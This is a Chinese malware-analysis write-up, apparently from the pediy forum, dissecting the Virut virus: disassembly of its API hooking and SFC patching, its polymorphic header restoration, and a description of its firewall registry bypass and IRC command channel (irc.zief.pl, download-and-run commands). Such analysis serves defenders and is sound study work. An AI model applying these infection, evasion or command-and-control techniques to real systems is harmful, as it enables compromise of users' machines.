
# virut 分析

> 原文：[`www.pediy.com/kssd/pediy10/97877.html`](https://www.pediy.com/kssd/pediy10/97877.html)

## Virut 完整分析

### 前言

写这个东西唯一的目的就是找工作，貌似我太功利了。

大概 2 个月前去某公司应聘，被问住了，无比羞愧中，觉得自己水平真是很差。

## 一：功能分析

`virut`的代码中用了不少`shellcode`的优化技巧，静态分析难度加大了点，不说废话了。

### 1. 通过时间随机确定是否执行病毒体主代码

```
.rsrc:01037C4C 80 EA C2             sub     dl, 0C2h
.rsrc:01037C4F F8                   clc
.rsrc:01037C50 B0 25               mov     al, 25h
.rsrc:01037C52 B2 46               mov     dl, 46h
.rsrc:01037C54 F6 E1               mul     cl
.rsrc:01037C56 00 85 FE 3E 00 00   add     [ebp+3EFEh], al ; 103bb1c  ret  C3+25(0)  根据时间随机
                                     ; 决定 是否执行 CALL 0103BADE
```

### 2. 创建 SECTION 对象

对象名通过时间来随机确定，复制代码到`SECTION`中，并执行。

`SECTION`对象名：`\\BaseNamedObjects\\???tVt`

### 3. 进程列表中从第 4 个进程开始 HOOK 了 ZwCreateFile,ZwQueryInformationProcess，ZwCreateProcessEx，ZwOpenFile

并创建远程线程。

```
.src:01038B2B 83 E9 05            sub     ecx, 5
.rsrc:01038B2E 2B C8             sub     ecx, eax;计算函数偏移
.rsrc:01038B30 51               push    ecx
.rsrc:01038B31 68 00 00 00 E8    push    0E8000000h
.rsrc:01038B36 8D 4C 24 03       lea     ecx, [esp+8+var_5]
.rsrc:01038B3A 6A 00             push    0
.rsrc:01038B3C 6A 05             push    5
.rsrc:01038B3E 51               push    ecx
.rsrc:01038B3F 50               push    eax
.rsrc:01038B40 53               push    ebx
.rsrc:01038B41 6A 05             push    5
.rsrc:01038B43 8B CC             mov     ecx, esp
.rsrc:01038B45 50               push    eax
.rsrc:01038B46 8B D4             mov     edx, esp
.rsrc:01038B48 50               push    eax
.rsrc:01038B49 54               push    esp
.rsrc:01038B4A 6A 40             push    40h
.rsrc:01038B4C 51               push    ecx
.rsrc:01038B4D 52               push    edx
.rsrc:01038B4E 53               push    ebx
.rsrc:01038B4F FF 95 F8 50 1B 00 call    dword ptr [ebp+1B50F8h];修改内存属性
.rsrc:01038B55 83 C4 0C          add     esp, 0Ch
.rsrc:01038B58 FF 95 08 51 1B 00 call    dword ptr [ebp+1B5108h];写入 5 个字节的指令
.rsrc:01038B5E 83 C4 08          add     esp, 8
.rsrc:01038B61 C3               retn
```

### 4. 远程线程

如果进程是`winlogon`，则`PATCH SFC`的 1 号导出函数以关闭文件保护。

```
.remote:001B220C             mov     edx, ss:ExitThread[ebp]
.remote:001B2212             sub     edx, edi
.remote:001B2214             sub     edx, 7
.remote:001B2217             mov     dword ptr [edi], 0E8006Ah
.remote:001B221D             mov     [edi+3], edx    ; 替换   调用完 NtWaitForMultipleObjects
                                    ;   线程直接退出
.remote:001B2220             retn
```

(下面不贴代码了 没意思)

写入注册表`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List`
键为：文件路径，值为：文件路径:`*`:enabled:`@shell32.dll,-1`

打开`\\Device\\PhysicalMemory`对象，并创建线程恢复`SSDT`。

连接到`irc.zief.pl`。

发送：
- `NICK ????????`
- `USER ?`

发送：
- 版本号
- `#硬盘序列号`
- 序列号累加和最后一字节
- `Service Pack`版本
- `\nJOIN`

发送：
- `#.364\n`

接收命令：

接收：
- `PING`，则发送：`POIN`
- 设置注册表项`SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer`，键为`UpdateHost`，值为端口和主机 IP 的二进制值
- `PRIV`，子命令为`!get`则下载文件并运行
- 子命令为`!host`则更新主机网址

## 二：变形的恢复

`virut`代码大致可以分为 2 部分：`header`和`body`。它的变种不少，但基本上只是`header`变化，`body`功能不变。

而对于附件中的样本来说，感染的过程中`header`多态变形(其实就是加花并乱序排列)，`body`通过存放在`header`中的随机`key`加密自己。

在感染前，`virut`会自己把变形后的`header`还原。

还原时，`virut`依靠两个结构`BLOCK_DESCRI`和`RELOC_DESCRI`来转换的。

```
00000000 BLOCK_DESCRI     struc ; (sizeof=0x8)
00000000 o_NumberOfOpcode dw ?                  ; 变形前的 opcode 数目
00000002 o_offsetStart    dw ?                  ; 本块指令 变形前 在 virut 中的偏移
00000004 n_offsetStart    dw ?                  ; 本快指令变形后 在 virut 中的偏移
00000006 n_NumberOfOpcode dw ?                  ; 变形后 本块指令中 opcode 数目
00000006                     ; 最高位为 1 时代表 本块指令变形前是以跳转指令或者返回指令结尾
00000008 BLOCK_DESCRI     ends

00000000 RELOC_DESCRI     struc ; (sizeof=0x6)
00000000 o_offset         dw ?                  ; 跳转指令操作数 变形前在 virut 中的偏移
00000002 NexOffset        dw ?                  ; 跳转指令 下一条指令的偏移
00000004 TarOffset        dw ?                  ; 跳转指令目的地址的偏移
00000006 RELOC_DESCRI     ends
```

`virut`多态的过程，实际上是把`header`分成一个个小的`BLOCK`随机排列，并把相关信息用`BLOCK_DESCRI`描述。

`RELOC_DESCRI`是描述`header`中的`CALL`以及`JMP`之类需要重定位操作数的指令相关信息。

`RELOC_DESCRI`的值是固定不变的。

```
.remote:001B1664                     restore_virut:                    ; DATA XREF: .remote:restore_virut

.remote:001B1664 2D 64 16 1B 00              sub     eax, offset restore_virut ; 变形代码恢复
.remote:001B1669 5E                         pop     esi          ; virut_body 病毒体起始处
.remote:001B166A 8B E8                       mov     ebp, eax
.remote:001B166C 8D B8 00 10 1B 00          lea     edi, old_header[eax] ; 变形前的 virut_header
.remote:001B1672 01 04 24                    add     [esp], eax
.remote:001B1675 2B B5 20 1B 1B 00          sub     esi, ss:new_body_offset[ebp] ; 得到变形后的 virut 代码开始处
.remote:001B167B 33 D2                       xor     edx, edx
.remote:001B167D FE 8D 23 17 1B 00          dec     ss:number_block[ebp] ; 多态加密时 分块的个数

.remote:001B1683

.remote:001B1683                     loc_1B1683:                      ; CODE XREF: .remote:001B16E6j
.remote:001B1683 56                         push    esi          ; after_change_virut_header 入栈
.remote:001B1684 0F B7 9C D5 28 17+       movzx   ebx, ss:block.n_offsetStart[ebp+edx*8]
.remote:001B168C 0F B7 8C D5 2A 17+       movzx   ecx, ss:block.n_NumberOfOpcode[ebp+edx*8]
.remote:001B1694 03 F3                       add     esi, ebx
.remote:001B1696 3B 9D 20 1B 1B 00          cmp     ebx, ss:new_body_offset[ebp] ; 变形后的 body 在 virut 中的偏移
.remote:001B169C 76 06                       jbe     short continue_restore ; 是否处理完  长度比较
.remote:001B169E 81 EB 34 3D 00 00          sub     ebx, 3D34h

.remote:001B16A4

.remote:001B16A4                     continue_restore:               ; CODE XREF: .remote:001B169Cj
.remote:001B16A4 81 E1 FF 7F 00 00         and     ecx, 7FFFh

.remote:001B16AA

.remote:001B16AA                     loc_1B16AA:                     ; CODE XREF: .remote:001B16DBj
.remote:001B16AA 0F A3 9D 44 1A 1B+        bt      ss:is_rabish[ebp], ebx ;   位测试为 1 的则是垃圾指令
.remote:001B16B1 73 03                       jnb     short loc_1B16B6 ; 是否是花指令
.remote:001B16B3 46                           inc     esi          ; 变形后的 header 地址增 1
.remote:001B16B4 EB 24                       jmp     short loc_1B16DA
.remote:001B16B6                     ; ---------------------------------------------------------------------------

.remote:001B16B6

.remote:001B16B6                     loc_1B16B6:                     ; CODE XREF: .remote:001B16B1j
```
